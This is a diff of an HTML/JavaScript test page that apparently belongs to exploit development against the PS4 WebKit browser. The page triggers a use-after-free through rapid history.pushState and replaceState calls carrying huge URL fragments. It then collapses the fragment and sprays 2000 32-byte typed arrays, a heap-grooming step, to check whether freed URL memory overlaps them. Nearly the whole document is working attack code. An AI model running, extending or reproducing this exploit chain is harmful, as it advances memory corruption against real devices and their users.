@@ -2,121 +2,112 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Final Fragment Microtask Probe</title>
+<title>PS4 WebKit – Fragment → TypedArray Slot Probe</title>
 <style>
-body {
-    font-family: monospace;
-    background: #000;
-    color: #0f0;
-    padding: 20px;
-}
-button {
-    padding: 12px;
-    font-size: 16px;
-    font-weight: bold;
-}
-#log {
-    margin-top: 15px;
-    white-space: pre-wrap;
-    font-size: 12px;
-    max-height: 400px;
-    overflow-y: auto;
-    border: 1px solid #0f0;
-    padding: 10px;
-}
+body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+button { font-size:16px; padding:10px; margin:5px; }
+#log { white-space:pre-wrap; border:1px solid #0f0; padding:10px; margin-top:10px; max-height:70vh; overflow:auto; }
 </style>
 </head>
+
 <body>
+<h2>PS4 WebKit – UAF ⇄ TypedArray Intersection Test</h2>
 
-<h2>Final Fragment Microtask Probe</h2>
-<p>Target: detect transient corruption during fragment → inline(32) transition</p>
+<button onclick="runTest()">RUN TEST</button>
 
-<button onclick="run()">RUN FINAL TEST</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){
-    logEl.textContent += m + "\n";
-}
-
+function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-async function run(){
-    logEl.textContent = "";
-    log("=== UAF TRIGGER START ===");
+// =================================================
+// CONFIG (do not change)
+// =================================================
+const BASE = 977;
+const STEP = 14461;
+const ITERS = 48;
 
-    let size = 977;
-    const STEP = 14461;
+// =================================================
+// CORE TEST
+// =================================================
+async function runTest(){
+  logEl.textContent = "";
+  log("=== TEST START ===");
 
-    // ----------------------------
-    // Phase 1 – Confirmed UAF trigger
-    // ----------------------------
-    for(let i=0;i<48;i++){
-        let frag = "A".repeat(size);
-        history.pushState({}, "", "#"+frag);
-        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
-        if(i % 6 === 0)
-            setTimeout(()=>history.back(),0);
-        size += STEP;
-        await sleep(5);
+  let size = BASE;
+
+  // -------------------------------
+  // Phase 1 – Proven UAF Trigger
+  // -------------------------------
+  log("=== UAF TRIGGER START ===");
+  for(let i=0;i<ITERS;i++){
+    let frag = "A".repeat(size);
+    history.pushState({}, "", "#"+frag);
+    history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
+
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(),0);
+      log(`[ITER ${i}] back() async`);
     }
 
-    log(">>> UAF WINDOW <<<");
+    size += STEP;
+    await sleep(5);
+  }
 
-    // Snapshot before transition
-    const baselineLen = document.URL.length;
-    log("[BASE] URL.length = " + baselineLen);
+  log(">>> UAF WINDOW <<<");
+  await sleep(120);
 
-    let anomalies = 0;
+  // -------------------------------
+  // Baseline snapshot
+  // -------------------------------
+  const url = document.URL;
+  log("[BASE] URL.length = " + url.length);
 
-    // ----------------------------
-    // Phase 2 – Microtask race
-    // ----------------------------
-    Promise.resolve().then(()=>{
-        try {
-            // Force collapse to inline fragment (~32 bytes)
-            location.hash = "#B";
-        } catch(e){}
-    });
+  const offsets = [64,128,256,512,1024];
+  for(const o of offsets){
+    log(`[BASE] charCodeAt(${o}) = ${url.charCodeAt(o)}`);
+  }
 
-    Promise.resolve().then(()=>{
-        try {
-            const url = document.URL;
-            const probes = [0, 16, 32, 64, 128, 256, 512, 1024];
+  // -------------------------------
+  // Phase 2 – Force fragment collapse
+  // -------------------------------
+  location.hash = "#B";
+  await sleep(10);
 
-            for(let i=0;i<probes.length;i++){
-                const off = probes[i];
-                let v = url.charCodeAt(off);
+  log(">>> FRAGMENT COLLAPSED (hash small) <<<");
 
-                if(!Number.isFinite(v) || v < 0 || v > 255){
-                    anomalies++;
-                    log("[ANOMALY] charCodeAt(" + off + ") = " + v);
-                }
-            }
-        } catch(e){
-            anomalies++;
-            log("[EXCEPTION] during microtask read");
-        }
-    });
+  // -------------------------------
+  // Phase 3 – Targeted heap grooming
+  // -------------------------------
+  log(">>> ALLOCATING TYPED ARRAYS <<<");
 
-    Promise.resolve().then(()=>{
-        const finalLen = document.URL.length;
-        log("[AFTER] URL.length = " + finalLen);
+  let buffers = [];
+  let views = [];
 
-        if(finalLen !== 2 && finalLen !== 3 && finalLen !== 35){
-            anomalies++;
-            log("[ANOMALY] unexpected final length");
-        }
+  for(let i=0;i<2000;i++){
+    let ab = new ArrayBuffer(0x20); // 32 bytes
+    let ta = new Uint32Array(ab);
+    ta[0] = 0x41414141;
+    buffers.push(ab);
+    views.push(ta);
+  }
 
-        if(anomalies === 0){
-            log("=== RESULT: NO TRANSIENT CORRUPTION OBSERVED ===");
-            log("Bug is lifetime-only (DoS / Freeze / Crash)");
-        } else {
-            log("=== RESULT: TRANSIENT READ ANOMALY DETECTED ===");
-            log("This indicates exploitable fragment overlap");
-        }
-    });
+  await sleep(20);
+
+  // -------------------------------
+  // Phase 4 – Re-read URL backing
+  // -------------------------------
+  log(">>> POST-GROOM READ <<<");
+  log("[AFTER] URL.length = " + document.URL.length);
+
+  for(const o of offsets){
+    log(`[AFTER] charCodeAt(${o}) = ${document.URL.charCodeAt(o)}`);
+  }
+
+  log("history.length = " + history.length);
+  log("=== TEST END ===");
 }
 </script>
 </body>
